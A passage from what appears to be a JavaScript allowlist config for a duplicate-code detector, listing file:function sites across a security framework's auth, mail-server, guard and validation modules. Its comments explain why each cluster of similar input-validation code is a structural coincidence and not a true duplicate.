      // message naming the actual field (method / purpose / table / path / …).
      // validateOpts.requireNonEmptyString exists, but routing these through it
      // normalises the message to "<label> must be a non-empty string, got
      // <type>" and swaps the error class — a behaviour change, not a dedupe;
      // these are data-input field checks, not the opts-contract the helper
      // governs. (`X.length === 0` is a char-empty check — empty is empty in any
      // encoding — so this is unrelated to the byte-cap class.)
      mode:  "family-subset",
      files: [
        "lib/agent-idempotency.js:_checkArgs",
        "lib/agent-tenant.js:_sealField",
        "lib/archive-wrap.js:_tenantKeyWithRoot",
        "lib/atomic-file.js:copyDirRecursive",
        "lib/ddl-change-control.js:approve",
        "lib/ddl-change-control.js:reject",
        "lib/deprecate.js:alias",
        "lib/guard-filename.js:verifyExtractionPath",
        "lib/jose-jwe-experimental.js:decrypt",
        "lib/mail-deploy.js:_validateTlsRptReport",
        "lib/totp.js:uri",
      ],
    },
    {
      // requireNonEmptyString idiom (paired-field variant) — shape-only, same
      // class as the entry above but two-or-more consecutive `if (typeof X !==
      // "string" || X.length === 0) throw <ownError>(<ownCode>, <domainMsg>)`
      // checks (agent-tenant destroy preconditions stepUpToken + dualControlApprover
      // + reason; dpop proof; oauth native-SSO deviceSecret + idToken / client-
      // attestation fields; sd-jwt-vc-holder store fields; break-glass policy-set
      // table + fields; ddl-change-control propose sql + proposer; …). Each carries
      // its OWN error class (AgentTenantError / AuthError / OAuthError /
      // BreakGlassError / DdlChangeControlError / …), OWN code namespace, and a
      // domain-specific message (often with operator guidance, e.g. "destroy=true
      // requires opts.stepUpToken (operator's fresh MFA step-up grant)"). Routing
      // through validateOpts.requireNonEmptyString normalises the message to
      // "<label> must be a non-empty string, got <type>" and swaps the error class
      // — a behaviour change that DEGRADES the operator-facing error, not a dedupe.
      mode:  "family-subset",
      files: [
        "lib/agent-posture-chain.js:_appendHop",
        "lib/agent-tenant.js:_checkDestroyPreconditions",
        "lib/api-snapshot.js:write",
        "lib/auth/dpop.js:verify",
        "lib/auth/oauth.js:nativeSsoExchange",
        "lib/break-glass.js:unsealRowAsService",
        "lib/deprecate.js:alias",
        "lib/auth/oauth.js:verifyClientAttestation",
        "lib/auth/sd-jwt-vc-holder.js:store",
        "lib/backup/index.js:scheduleTest",
        "lib/break-glass.js:_validatePolicySet",
        "lib/ddl-change-control.js:propose",
        "lib/fda-21cfr11.js:_validateSignatureInput",
        "lib/guard-snapshot-envelope.js:validate",
        "lib/incident-report.js:open",
        "lib/mail-greylist.js:check",
        "lib/mail-helo.js:evaluate",
        // fp:c490acbe12d3 — the object-input + first-field-string-check preamble
        // across three unrelated domains. dual-control.request opens `if (!args ||
        // typeof args !== "object") throw _err("BAD_ARG", …); if (typeof args.action
        // !== "string" || args.action.length === 0) throw …`; notify.send the same
        // with _err("BAD_OPT", …) on input.channel; retention._validateRule with
        // _err("BAD_RULE", …) on rule.name. Divergent codes (BAD_ARG / BAD_OPT /
        // BAD_RULE), domain messages, and field names; the bodies diverge entirely
        // after the preamble (grant-record build / retry-timeout-breaker send / rule
        // field validation). Each module's _err carries its own code namespace —
        // routing through validateOpts normalises the message + swaps the class.
        "lib/dual-control.js:request",
        "lib/notify.js:send",
        "lib/retention.js:_validateRule",
        // fp:0723bf6899f5 — the SAME paired requireNonEmptyString preamble, but the
        // 60-tok shingle starts at the PRECEDING function's closing brace and spans
        // the next function's two `if (typeof X !== "string" || X.length === 0) throw`
        // checks, so _siteSetOf (first-occurrence + enclosing-fn of the start line)
        // attributes it one function up: agent-idempotency._fingerprintArgs /
        // atomic-file.ensureDir / totp.verify (whose closing braces precede the
        // requireNonEmptyString-opening function). Same shape-only idiom, attributed
        // to the preceding helper by the tokenizer.
        "lib/agent-idempotency.js:_fingerprintArgs",
        "lib/atomic-file.js:ensureDir",
        "lib/totp.js:verify",
      ],
    },
    {
      // Async opts-handler requireNonEmptyString preamble — shape-only. The
      // create / poll / exchange / extract handlers open `async function (opts) {
      // opts = opts || {}; if (typeof opts.<field> !== "string" ||
      // opts.<field>.length === 0) throw <OwnError>(<ownCode>, <domainMsg>); }`,
      // the requireNonEmptyString idiom inside an async opts-defaulting wrapper.
      // Each carries its OWN error class (ArchiveReadError / AuthError /
      // OAuthError / RestoreRollbackError) + code namespace + field-specific
      // message; routing through validateOpts.requireNonEmptyString normalises the
      // message and swaps the class. The archive _assertGuardMetadata pair rides
      // the same fileset shingle but is independently shape-only (per-format ZIP
      // vs TAR entry-metadata assertion). No two bodies are byte-identical —
      // verified across the unrelated archive / auth / restore domains.
      mode:  "family-subset",
      files: [
        "lib/archive-read.js:_assertGuardMetadata",
        "lib/archive-read.js:extract",
        "lib/archive-tar-read.js:_assertGuardMetadata",
        "lib/archive-tar-read.js:extract",
        "lib/auth/ciba.js:_registerInitialInterval",
        "lib/auth/ciba.js:_verifyIdTokenIfPresent",
        "lib/auth/ciba.js:pollToken",
        "lib/auth/oauth.js:exchangeToken",
        "lib/auth/oauth.js:pollDeviceCode",
        "lib/auth/oid4vci.js:createCredentialOffer",
        "lib/auth/oid4vci.js:exchangePreAuthorizedCode",
        "lib/auth/oid4vci.js:issueCredential",
        "lib/restore-rollback.js:swap",
      ],
    },
    {
      // validateOpts opts-validation preamble — shape-only convention. Each
      // factory/builder opens by validating its OWN opts field set through the
      // framework's per-field helpers (validateOpts.requireObject /
      // requireNonEmptyString / optionalNonEmptyString / optionalBoolean /
      // optionalPositiveInt / optionalFiniteNonNegative / optionalFunction /
      // requireMethods / auditShape), interleaved with that factory's bespoke
      // cross-field / domain throws (jar.build's key-presence, watcher's
      // mode-enum + poll-max-files, seal-pem-file's source≠destination,
      // http-client-cache's store-interface { get, set, delete, clear } check).
      // The shared 50-tok shingle is the validateOpts-CALL-SEQUENCE structure —
      // the dominant validation form (≈700 per-field validateOpts.* call sites
      // framework-wide), already composing the validateOpts primitive correctly.
      // It is not an extractable sub-primitive: each validates a DIFFERENT field
      // set with DIFFERENT validators + DIFFERENT bespoke codes, and the
      // interleaved cross-field checks are not single-field schema rules.
      // (validateOpts.shape is the newer schema form adopted by ~24 factories;
      // converging these mixed-validation bodies onto it would be inconsistent
      // with the ~685 other per-field sites and could not cleanly absorb the
      // cross-field throws — a separate, behaviour-verified migration, not a
      // dedupe.)
      mode:  "family-subset",
      files: [
        "lib/auth/jar.js:build",
        "lib/auth/sd-jwt-vc-issuer.js:create",
        "lib/compliance-eaa.js:create",
        "lib/crypto-field.js:declarePerRowResidency",
        "lib/db.js:declareRequireDualControl",
        "lib/http-client-cache.js:create",
        "lib/http-client.js:_validateDownloadOpts",
        "lib/mail-arc-sign.js:sign",
        "lib/mail-server-tls.js:context",
        "lib/middleware/dpop.js:create",
        "lib/middleware/protected-resource-metadata.js:create",
        "lib/tcpa-10dlc.js:recordConsent",
        "lib/vault/seal-pem-file.js:sealPemFile",
        "lib/watcher.js:_validateOpts",
      ],
    },
    {
      // requireNonEmptyArray idiom — shape-only. `if (!Array.isArray(X) ||
      // X.length === 0) throw <ownError>(<ownCode>, <domainMsg>)`, the array
      // sibling of the non-empty-string check. Each site names its own field and
      // cites its own spec ("Group.entries MUST be a non-empty array (RFC 8984)",
      // a policy set, a COSE recipients array, …) with its own error class — a
      // structural coincidence, not extractable shared logic.
      mode:  "family-subset",
      files: [
        "lib/auth/fido-mds3.js:_validateChain",
        "lib/auth/oid4vp.js:_validateDcql",
        "lib/auth/sd-jwt-vc-issuer.js:create",
        "lib/breach-deadline.js:trackReport",
        "lib/cms-codec.js:encodeEnvelopedData",
        "lib/cms-codec.js:encodeSignedData",
        "lib/mail-crypto-pgp.js:experimentalEncrypt",
        "lib/auth/step-up.js:parseAuthorizationDetails",
        "lib/auth/step-up-policy.js:acrAny",
        "lib/auth/step-up-policy.js:amr",
        "lib/middleware/require-methods.js:create",
        "lib/network-dns.js:setServers",
        "lib/network-dns.js:useDesignatedResolvers",
        "lib/network-tls.js:setKeyShares",
        "lib/safe-schema.js:tuple",
        "lib/safe-schema.js:union",
        "lib/safe-sql.js:quoteList",
        "lib/break-glass.js:_validatePolicySet",
        "lib/calendar.js:validate",
        "lib/cose.js:macVerify0",
        "lib/cose.js:verify",
        "lib/db.js:declareRequireDualControl",
        "lib/dsr.js:create",
        "lib/fedcm.js:accountsResponse",
        "lib/fedcm.js:wellKnown",
        "lib/guard-saga-config.js:validate",
        "lib/middleware/assetlinks.js:create",
        "lib/network-heartbeat.js:_validateTarget",
        "lib/network-heartbeat.js:start",
        // fp:af76a61f3dac — the required-non-empty-array + length-cap pair across
        // three unrelated domains: cert.create (opts.certs / MAX_CERTS_PER_MANAGER),
        // mail-send-deliver.deliver, vc.present (opts.credentials /
        // MAX_PRESENTATION_CREDENTIALS). Each carries TWO distinct codes (no-empty +
        // too-many), its own error class, a domain-specific message (vc plain;
        // cert's "...of cert manifests" suffix), and its own cap constant — routing
        // through a single validator would normalise the messages and can't carry the
        // two codes, so it stays a structural coincidence (unlike optionalDate, whose
        // message IS reproducible via the label).
        "lib/cert.js:create",
        "lib/mail-send-deliver.js:deliver",
        "lib/vc.js:present",
        // fp:2a0133cf5eb3 — the per-element-string variant `!Array.isArray(X) ||
        // X.length === 0 || !X.every(function (y) { return typeof y === "string" &&
        // y.length > 0; })` (a non-empty array of non-empty strings). The inline-
        // optional-non-empty-string-array DETECTOR matches only the `for (i)
        // X[i]`-index form, not this `.every()` form. dual-control.create uses an
        // _err CLOSURE (not a typed class) inside a null-allowed optional; mdoc/tsa
        // coerce a lone string to a 1-element array FIRST and carry domain messages
        // ("role-name strings" / "PEM string or array") — divergent error mechanism +
        // message + context, so routing to optionalNonEmptyStringArray would normalise
        // them. Same array-validation shape-only class as the entries above.
        "lib/dual-control.js:create",
        "lib/mdoc.js:verifyIssuerSigned",
        "lib/tsa.js:verifyToken",
      ],
    },
    {
      // fp:889fe5ae9f52 — the per-element "must be an object" check inside an
      // array-iteration loop. guard-mail-compose._checkBody (attachments),
      // guard-saga-config.validate (steps), and mail-auth.authResultsEmit
      // (results) each open `var <acc> = <init>; for (var i ...) { var el =
      // arr[i]; if (!el || typeof el !== "object") throw new <Err>("<code>",
      // "<label>[" + i + "] must be an object"); }`. The accumulator init
      // (total = 0 / Object.create(null) / []) and the rest of each loop body
      // diverge entirely (sum attachment sizes / dedup step names / parse the AR
      // method + result). It is the b5f63d71b320 object-input-check idiom moved
      // inside a loop: 32 sites framework-wide carry the "[idx] must be an
      // object" form with divergent disposition (throw / errors.push /
      // Promise.reject), error mechanism (typed class / TypeError / _err with a
      // permanent flag), and index form (numeric i / quoted 'id' /
      // JSON.stringify(key)) — and validateOpts.requireObject's message
      // ("<label>: opts must be an object, got <type>") cannot reproduce the bare
      // "<label> must be an object" form, so routing would mold the message and
      // swap the error mechanism. Shape-only.
      mode:  "family-subset",
      files: [
        "lib/guard-mail-compose.js:_checkBody",
        "lib/guard-saga-config.js:validate",
        "lib/mail-auth.js:authResultsEmit",
      ],
    },
    {
      // fp:6a64389b8381 — the for-in-over-object-values + per-value "must be an
      // object" check. The AsyncAPI/OpenAPI document validators iterate a map
      // (doc.operations / input.content / op.responses) and reject any non-object
      // value: asyncapi.parse, openapi-paths-builder._normaliseRequestBody /
      // _normaliseResponses, openapi._validateItemOperations / parse. Same
      // b5f63d71b320 object-input-check idiom as the per-element (array-index)
      // variant above, in a `for (var k in map)` loop — and it diverges in
      // disposition (errors.push(...) + continue for the document-error
      // accumulators vs throw new OpenApiError(...) for the request-body
      // normaliser), error mechanism (string-array vs typed class), and message
      // ("operations.X: must be an object" / "<METHOD> <label> response X: must
      // be an object" / "content[<ct>] must be an object"). Routing through a
      // shared validator would normalise the message and force one disposition.
      // Shape-only.
      mode:  "family-subset",
      files: [
        "lib/asyncapi.js:parse",
        "lib/openapi-paths-builder.js:_normaliseRequestBody",
        "lib/openapi-paths-builder.js:_normaliseResponses",
        "lib/openapi.js:_validateItemOperations",
        "lib/openapi.js:parse",
      ],
    },
    {
      // fp:20174618f58c + fp:617c6a71b16f — the compact-JOSE decode preamble.
      // jwt.decode owns the canonical 3-segment split; the callers each open with
      // a non-empty-string guard (the 0e1798b44f4f requireNonEmptyString idiom,
      // with a per-caller byte-cap on the proof/statement variants), then
      // `var parts = X.split("."); if (parts.length !== N)`. They DIVERGE: the
      // segment count (3 for JWS — jwt/fido-mds3/oid4vci/openid-federation/oauth
      // backchannel; 5 for JWE — jose-jwe-experimental.decrypt), the error class +
      // code + message ("token must be a non-empty string" / "BLOB token..." /
      // "proof JWT is empty or exceeds N bytes" / "entity statement empty or
      // exceeds N bytes"), and the post-split header/segment checks (fido adds
      // per-segment maxBytes + x5c checks; oid4vci/openid-federation a byte cap).
      // Routing through jwt.decode would normalise the message/class and can't
      // express the 5-segment JWE or the per-caller caps — the jws-decode family
      // is per-caller divergent (the algParams TABLE was the only shared part, and
      // it is already extracted to jwtExternal.algParams). Shape-only.
      mode:  "family-subset",
      files: [
        "lib/auth/fido-mds3.js:_parseJws",
        "lib/auth/jwt.js:decode",
        "lib/jose-jwe-experimental.js:decrypt",
        "lib/auth/oauth.js:verifyBackchannelLogoutToken",
        "lib/auth/oid4vci.js:_verifyProofJwt",
        "lib/auth/openid-federation.js:parseEntityStatement",
      ],
    },
    {
      // fp:be074d5072ca + fp:a490c73e372c — the try/catch-rethrow-as-typed-error
      // idiom around a parse/serialize call. `try { X = <op>(...); } catch (e) {
      // throw new <Err>("<code>", "<ctx>: " + ((e && e.message) || String(e))); }`
      // where <op> is JSON.stringify / safeJson.stringify (agent-idempotency._put,
      // guard-event-bus-payload.validate, guard-snapshot-envelope.validate —
      // "not JSON-serializable") or safeJson.parse / zlib.gunzipSync (auth/ciba
      // .parseNotification, oauth._postForm + registerClient, network-smtp-policy
      // .tlsRptParseReport — "not JSON" / "gunzip failed"). The operation, error
      // class, code, and message all diverge per caller; only the generic
      // wrap-a-throwing-call-in-a-typed-error control-flow shape coincides.
      // Shape-only.
      mode:  "family-subset",
      files: [
        "lib/agent-idempotency.js:_put",
        "lib/guard-event-bus-payload.js:validate",
        "lib/guard-snapshot-envelope.js:validate",
        "lib/auth/ciba.js:parseNotification",
        "lib/auth/oauth.js:_postForm",
        "lib/auth/oauth.js:registerClient",
        "lib/network-smtp-policy.js:tlsRptParseReport",
      ],
    },
    {
      // fp:4e733fabeb50 — the module-top require block + error-class declaration
      // (asyncapi-bindings / lro / openapi-security each open `var numericBounds =
      // require(...); var bCrypto = require(...); var C = require(...); var {
      // defineClass } = require(...); var <X>Error = defineClass(...)`). §9
      // top-of-file requires cannot be hoisted; the defineClass call is the
      // standard framework error-class declaration. Convention, not a dup.
      mode:  "family-subset",
      files: [
        "lib/asyncapi-bindings.js:<top>",
        "lib/lro.js:<top>",
        "lib/openapi-security.js:<top>",
      ],
    },
    {
      // fp:d8383361daaf — the numericBounds.requireAllPositiveFiniteIntIfPresent
      // composition. mail-deploy.parseTlsRptReport, mail-server-imap.create, and
      // mail-server-pop3.create each throw a bespoke input/mailStore error then
      // call `numericBounds.requireAllPositiveFiniteIntIfPresent(opts, [<bound opt
      // names>], "<label>", <Err>, "<code>")` — already routed through the
      // extracted primitive, varying only in the opt-name array (maxCompressed/
      // maxDecompressed/maxRatio vs maxLineBytes/maxLiteralBytes/idleTimeoutMs vs
      // maxLineBytes/idleTimeoutMs/commitTimeoutMs), label, error class, and code.
      // Correct composition of the cap-validation primitive, not a hand-roll.
      mode:  "family-subset",
      files: [
        "lib/mail-deploy.js:parseTlsRptReport",
        "lib/mail-server-imap.js:create",
        "lib/mail-server-pop3.js:create",
      ],
    },
    {
      // fp:6d6e8efcc5e1 — the gateContract.resolveProfileName composition + the
      // per-caller bad-profile throw. guard-envelope.check, mail-greylist.create,
      // and mail-helo.evaluate each open `var profile = gateContract
      // .resolveProfileName(opts, COMPLIANCE_POSTURES, DEFAULT_PROFILE); if
      // (!PROFILES[profile]) throw new <Err>("<x>/bad-profile", "<fn>: unknown
      // profile '" + profile + "'")`. resolveProfileName is the extracted
      // primitive (the resolution expression); the bad-profile throw is kept
      // per-caller VERBATIM by design (divergent error class + "check:" /
      // "create:" / "evaluate:" message prefix — the 3c2ab38a1cd8 extraction
      // deliberately left the throw inline so the domain message is preserved).
      // Correct composition, not a dup.
      mode:  "family-subset",
      files: [
        "lib/guard-envelope.js:check",
        "lib/mail-greylist.js:create",
        "lib/mail-helo.js:evaluate",
      ],
    },
    {
      // fp:d37a3d40ff97 — the guard identifier-name validation preamble. The five
      // guards (agent-registry._checkName, event-bus-topic.validate, idempotency-
      // key.validate, mail-sieve._checkName, tenant-id.validate) open with the
      // typed bad-input + byte-cap preamble (`typeof name !== "string" ||
      // name.length === 0` throw; `Buffer.byteLength(name) > cap` throw) and then
      // diverge entirely (RESERVED-prefix / dot-count / leading-dot / ".."+
      // charclass rules). The preamble carries divergent error CLASSES, CODES, and
      // MESSAGES per guard (idempotency-key even splits typeof vs empty into two
      // codes), so a normalised helper would mold them — the verified
      // b5f63d71b320 / requireNonEmptyString preamble class. Shape-only. The fp's
      // collapsed siteSet also pulls in middleware/bearer-auth.create (a
      // first-occurrence attribution collision — its create() validateOpts +
      // verify-fn check tokenizes alike in a 50-tok window with the name
      // preamble), listed so the per-subset collapsed clusters sharing this fp are
      // covered by one entry.
      mode:  "family-subset",
      files: [
        "lib/guard-agent-registry.js:_checkName",
        "lib/guard-event-bus-topic.js:validate",
        "lib/guard-idempotency-key.js:validate",
        "lib/guard-mail-sieve.js:_checkName",
        "lib/guard-tenant-id.js:validate",
        "lib/middleware/bearer-auth.js:create",
      ],
    },
    {
      // fp:104ab40febc6 — another per-element "must be an object" array-loop check
      // (sibling of fp:889fe5ae9f52). sd-jwt-vc-issuer.create iterates opts.keys,
      // guard-saga-config.validate iterates config.steps, network-heartbeat
      // ._validateTarget validates a target — each rejecting a non-object element
      // with `if (!el || typeof el !== "object") throw new <Err>("<code>",
      // "<label>[" + i + "] must be an object")`. The b5f63d71b320 object-input-
      // check idiom; divergent error class/code/message + per-element follow-on
      // checks (kid string / step name+dedup). Shape-only. (guard-saga-config
      // .validate also clusters in fp:889fe5ae9f52 — the cross-family overlap.)
      // The fp's collapsed siteSet spans several validation functions that share
      // the idiom across unrelated domains — oid4vp._validateDcql (DCQL query
      // entries), auth/step-up.parseAuthorizationDetails (RAR objects), fedcm
      // .accountsResponse (account entries), compose-pipeline.composePipeline
      // (the `var seenNames = Object.create(null)` + per-entry object check, the
      // exact saga shape) — plus a first-occurrence collapse onto
      // network-heartbeat._validateTarget; all are listed so the per-subset
      // collapsed clusters that share this fp are covered by one entry.
      mode:  "family-subset",
      files: [
        "lib/auth/sd-jwt-vc-issuer.js:create",
        "lib/guard-saga-config.js:validate",
        "lib/network-heartbeat.js:_validateTarget",
        "lib/auth/oid4vp.js:_validateDcql",
        "lib/auth/step-up.js:parseAuthorizationDetails",
        "lib/fedcm.js:accountsResponse",
        "lib/middleware/compose-pipeline.js:composePipeline",
      ],
    },
    {
      // fp:bbc27b18d643 — a coincidental structural collision across three
      // unrelated domains: auth/step-up-policy's acr / acrAny policy-clause
      // builders, network-dns._clearCache (POSITIVE_CACHE.clear() +
      // NEGATIVE_CACHE.clear()), and safe-schema's _tupleWithRest / chain schema
      // builders. No shared behaviour — a function-declaration + a couple of
      // assignments/returns tokenize alike. Shape-only coincidence.
      mode:  "family-subset",
      files: [
        "lib/auth/step-up-policy.js:acr",
        "lib/auth/step-up-policy.js:acrAny",
        "lib/network-dns.js:_clearCache",
        "lib/safe-schema.js:_tupleWithRest",
        "lib/safe-schema.js:chain",
      ],
    },
    {
      // Guard validate() object-input preamble — shape-only convention. Every
      // guard's validate() opens `opts = opts || {}; var profile =
      // PROFILES[_resolveProfile(opts)]; if (!X || typeof X !== "object") throw
      // <GuardError>("<ns>/bad-input", "<ns>.validate: <field> required")`. The
      // _resolveProfile call already routes through gateContract.makeProfileResolver
      // (the extracted primitive); the object-check is the b5f63d71b320 data-input
      // idiom (divergent error class/code/message). Correct composition, not a dup.
      mode:  "family-subset",
      files: [
        "lib/guard-agent-registry.js:validate",
        "lib/guard-mail-move.js:validate",
        "lib/guard-mail-reply.js:validate",
        "lib/guard-mail-sieve.js:validate",
        "lib/guard-posture-chain.js:validate",
        "lib/guard-saga-config.js:validate",
        "lib/guard-stream-args.js:validate",
        "lib/guard-trace-context.js:validate",
        "lib/guard-event-bus-payload.js:validate",
        "lib/guard-event-bus-topic.js:validate",
        "lib/guard-idempotency-key.js:validate",
        "lib/guard-jmap.js:validate",
        "lib/guard-list-unsubscribe.js:validate",
        "lib/guard-mail-compose.js:validate",
        "lib/guard-message-id.js:validate",
        "lib/guard-snapshot-envelope.js:validate",
        "lib/guard-tenant-id.js:validate",
      ],
    },
    {
      // Mail-server family scaffolding — shape-only. The mailbox / transfer
      // servers (imap / pop3 / managesieve / mx / submission / jmap) share a
      // 50-tok shingle across their module-top require block and their create()
      // setup (state init + the createTcpListener / admitConnection composition,
      // both already extracted to mail-server-net), and across protocol-handler
      // bodies that then diverge entirely (IMAP AUTHENTICATE vs SMTP AUTH vs POP3
      // PASS vs JMAP back-ref resolution). The require block is §9 (cannot hoist);
      // the create scaffolding composes the extracted mail-server-net primitives;
      // the handlers are protocol-specific. The one genuine cross-file dup that
      // DID hide here — mx/submission's identical _validateDomainHardened — is
      // extracted to mailServerNet.validateDomainHardened (its own inverse
      // detector); no other two bodies are byte-identical.
      mode:  "family-subset",
      files: [
        "lib/mail-server-imap.js:<top>",
        "lib/mail-server-imap.js:create",
        "lib/mail-server-imap.js:_handleAuthenticate",
        "lib/mail-server-imap.js:_unquote",
        "lib/mail-server-jmap.js:_resolveBackRefs",
        "lib/mail-server-jmap.js:downloadHandler",
        "lib/mail-server-jmap.js:emailSubmissionSetHandler",
        "lib/mail-server-jmap.js:eventSourceHandler",
        "lib/mail-server-managesieve.js:<top>",
        "lib/mail-server-managesieve.js:create",
        "lib/mail-server-mx.js:<top>",
        "lib/mail-server-mx.js:create",
        "lib/mail-server-mx.js:_isRelayAllowed",
        "lib/mail-server-mx.js:_validateDomainHardened",
        "lib/mail-server-submission.js:_validateDomainHardened",
        "lib/mail-server-pop3.js:<top>",
        "lib/mail-server-pop3.js:create",
        "lib/mail-server-pop3.js:_assertTenantOrRefuse",
        "lib/mail-server-pop3.js:_close",
        "lib/mail-server-pop3.js:_handlePass",
        "lib/mail-server-submission.js:<top>",
        "lib/mail-server-submission.js:create",
        "lib/mail-server-submission.js:_handleAuth",
      ],
    },
    {
      // Header / structured-field parse loop — shape-only. `value.split(<sep>);
      // for (…) { var raw = items[i].trim(); if (raw.length === 0) continue; …
      // raw.split / indexOf … }` — the split → iterate → trim → skip-empty →
      // find-separator spine recurs across complex header parsers whose PER-FORMAT
      // handling diverges entirely: W3C baggage (key=value plus `;props`
      // metadata), W3C tracestate (vendor-id validation), Accept quality lists
      // (`;q=` float weights), Tus Upload-Metadata (space-separated base64),
      // HTTP-message-signature structured-field params, password policy checks.
      // The clean `key<sep>value` cases were already routed to
      // structuredFields.parseKeyValuePieces; these keep their bespoke per-format
      // parsing (baggage props / base64 decode / quality float / SF grammar), so
      // the shared part is the loop spine only — not a clean kv-piece route.
      mode:  "family-subset",
      files: [
        "lib/auth/password.js:check",
        "lib/http-message-signature.js:_parseSignatureInput",
        "lib/middleware/tus-upload.js:_parseMetadata",
        "lib/observability.js:_parseBaggage",
        "lib/observability.js:_parseTracestate",
        "lib/request-helpers.js:parseQualityList",
      ],
    },
    {
      // catch → audit + rethrow idiom — shape-only. `catch (e) { …, detail: (e &&
      // e.message) || String(e) }); throw new <OwnError>(<ownCode>, <msg> + ((e &&
      // e.message) || String(e))); }` — recording the failure (in an audit /
      // result payload) and rethrowing it as the module's own typed error, with
      // the generic `(e && e.message) || String(e)` safe-message extraction
      // (tuned-out language idiom). Recurs across unrelated handlers (agent
      // snapshot run, bot-challenge verify, DSR submit, S/MIME signer verify,
      // self-update poll) each over a DIFFERENT wrapped operation with its OWN
      // error class + code + audit shape. Coincidental error-handling shape.
      mode:  "family-subset",
      files: [
        "lib/agent-snapshot.js:_runHandler",
        "lib/auth/bot-challenge.js:verify",
        "lib/dsr.js:submit",
        "lib/mail-crypto-smime.js:_verifySignerInfo",
        "lib/self-update.js:poll",
      ],
    },
    {
      // Spec entry-validation preamble — shape-only. `function _validate<X>(entry,
      // label) { if (!entry || typeof entry !== "object") throw <OwnError>(…);
      // validateOpts.requireNonEmptyString(entry.<field>, …); … }` — the object-
      // input preamble (b5f63d71b320) composed with validateOpts on per-spec
      // fields. Recurs across the API-document validators (AsyncAPI / OpenAPI
      // server entries, OpenAPI parameter normalisation, deprecate + inbox opts)
      // — and although asyncapi._validateServerEntry and openapi._validateServerEntry
      // SHARE A NAME, they validate DIFFERENT schemas (AsyncAPI server = host +
      // protocol; OpenAPI server = url) with different error classes, so they are
      // NOT a byte-identical dup. Object-input check + validateOpts composition,
      // divergent fields and error contracts.
      mode:  "family-subset",
      files: [
        "lib/asyncapi.js:_validateServerEntry",
        "lib/deprecate.js:_validateOpts",
        "lib/inbox.js:_validateReceiveOpts",
        "lib/openapi-paths-builder.js:_normaliseParameter",
        "lib/openapi.js:_validateServerEntry",
      ],
    },
    {
      // Enum / allow-list validation idiom — shape-only. `var x = opts.<field> ||
      // <default>; if (<ALLOWED>.indexOf(x) === -1) throw <OwnError>(<ownCode>,
      // <msg> + <ALLOWED>.join(…))` — defaulting an enum opt then rejecting it if
      // not in a fixed allow-list. Recurs across unrelated validators (sanctions
      // screening mode, WCAG conformance level, ARC/DKIM canonicalisation, VEX
      // status) each over a DIFFERENT enum with its OWN error class + code +
      // message. The `|| default` + `indexOf(...) === -1 → throw` shape coincides;
      // the allowed set and error contract are domain-specific — routing through
      // a shared requireOneOf helper normalises the message and swaps the class
      // (the requireNonEmptyString-class rule).
      mode:  "family-subset",
      files: [
        "lib/ai-disclosure.js:chatbot",
        "lib/backup/index.js:bundleAdapterStorage",
        "lib/compliance-sanctions.js:create",
        "lib/guard-html-wcag.js:audit",
        "lib/importmap-integrity.js:build",
        "lib/mail-arc-sign.js:sign",
        "lib/mail-dkim.js:create",
        "lib/metrics.js:shadowRegistry",
        "lib/vex.js:document",
      ],
    },
    {
      // String-array validation loop (throw variant) — shape-only. `var out = [];
      // for (var i = 0; i < arr.length; i++) { if (typeof arr[i] !== "string" ||
      // arr[i].length === 0) throw <OwnError>(<ownCode>, <domainMsg>); … }` — the
      // requireNonEmptyString element check inside an index loop, throwing rather
      // than the filter-loop's skip. Recurs across unrelated array validators
      // (access-lock key list, fido-mds3 cert-chain, config allow-list, mail-dkim
      // selector list, require-bound-key binding list) each with its OWN error
      // class + code + domain message; routing through a shared loop helper
      // normalises the message and swaps the class — the requireNonEmptyString-
      // class rule. Coincidental loop shape, divergent per-element handling.
      mode:  "family-subset",
      files: [
        "lib/auth/access-lock.js:create",
        "lib/auth/fido-mds3.js:_validateChain",
        "lib/auth/passkey.js:_validateExpectedOrigin",
        "lib/config.js:create",
        "lib/guard-mail-compose.js:_checkAddrList",
        "lib/mail-arc-sign.js:sign",
        "lib/mail-dkim.js:create",
        "lib/metrics.js:_shadowSetOf",
        "lib/middleware/require-bound-key.js:create",
        "lib/middleware/require-methods.js:create",
        "lib/middleware/security-txt.js:_arrayOfStrings",
        "lib/network-tls.js:buildOptions",
        "lib/pick.js:registerPoisonedKeys",
        "lib/ws-client.js:connect",
      ],
    },
    {
      // call-validator-if-defined idiom — shape-only. `if (opts.<a> !== undefined)
      // <validate>("<a>", opts.<a>); if (opts.<b> !== undefined) <validate>("<b>",
      // opts.<b>); …` — calling a per-field validator for each supplied opt. Recurs
      // across auth-bot-challenge create + jwt numeric-date validation. The
      // formerly-clustered external-db._requirePosInt / http-client._requirePositiveInt
      // positive-int re-rolls are now ROUTED through numericBounds.requirePositiveFinite*
      // (the inline-positive-finite-int-hand-rolled detector guards the class), so they
      // no longer participate; the call-if-defined SHAPE itself is a generic idiom
      // across divergent validators.
      mode:  "family-subset",
      files: [
        "lib/auth-bot-challenge.js:create",
        "lib/auth/jwt.js:_requireNumericDate",
      ],
    },
    {
      // validate-string-then-parse idiom — shape-only. `function _<x>(s) { if
      // (typeof s !== "string" || s.length === 0) throw <OwnError>(…); var m =
      // <parse>(s); if (!m) throw <OwnError>(…); … }` — the requireNonEmptyString
      // guard followed by a domain parse/match that throws on failure. Recurs
      // across unrelated parsers (DDL change-id approve/reject, LRO operation-id
      // cancel/status, money decimal-string parsing, ISO-8601 time parsing) each
      // with its OWN parser (regex / lookup) + error class + message. The guard +
      // parse-or-throw SHAPE coincides; the parser and error contract are
      // domain-specific.
      mode:  "family-subset",
      files: [
        "lib/ddl-change-control.js:approve",
        "lib/ddl-change-control.js:reject",
        "lib/lro.js:cancel",
        "lib/lro.js:status",
        "lib/money.js:_parseDecimalString",
        "lib/money.js:_rationalFromDecimalString",
        "lib/time.js:parseISO",
      ],
    },
    {
      // requireNonEmptyString + opts-default preamble — shape-only. `function
      // _<x>(name, opts) { if (typeof name !== "string" || name.length === 0)
      // throw <OwnError>(…); opts = opts || {}; var <y> = opts.<z>; … }` — a
      // required-string-arg check followed by opts-defaulting. Recurs across
      // archive-adapters fs/http builders, crypto-field per-row-key declaration,
      // MTA-STS fetch, safe-env var reading — divergent error class / fields.
      mode:  "family-subset",
      files: [
        "lib/archive-adapters.js:fs",
        "lib/archive-adapters.js:http",
        "lib/crypto-field.js:declarePerRowKey",
        "lib/network-smtp-policy.js:mtaStsFetch",
        "lib/parsers/safe-env.js:readVar",
      ],
    },
    {
      // middleware URL path / query-string strip idiom — shape-only. `var url =
      // req.url || "/"; var qIdx = url.indexOf("?"); var path = qIdx === -1 ? url
      // : url.slice(0, qIdx); …` — deriving the request path from req.url by
